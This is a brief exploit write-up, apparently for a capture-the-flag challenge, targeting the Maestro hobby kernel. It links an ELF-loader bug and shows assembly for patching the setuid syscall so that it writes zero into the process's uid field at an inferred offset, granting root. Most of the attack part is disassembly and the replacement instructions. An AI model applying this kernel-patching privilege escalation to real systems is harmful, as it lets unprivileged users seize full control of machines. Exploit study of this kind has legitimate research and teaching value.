BUG: https://github.com/llenotre/maestro/blob/a26b77a4e46984f17919c2a337665a7fbf6527a9/src/process/exec/elf.rs#L705

Exploit:

At function `kernel::syscall::setuid::setuid::h1bc937266fb4cdc1`,

it checks `self->euid` at:
```x86asm
.text:C025E672                 movsx edx, word ptr [edi+0x40]
.text:C025E676                 test    dx, dx
```

so I could guess that `self->uid` is at [edi+0x3c]

try to change the instruction to ( `edx` is equals to 0 when the kernel jumps to this):

```x86asm
.text:C025E672                 nop
.text:C025E673                 mov     [edi+3Ch], edx
.text:C025E676                 test    dx, dx
```
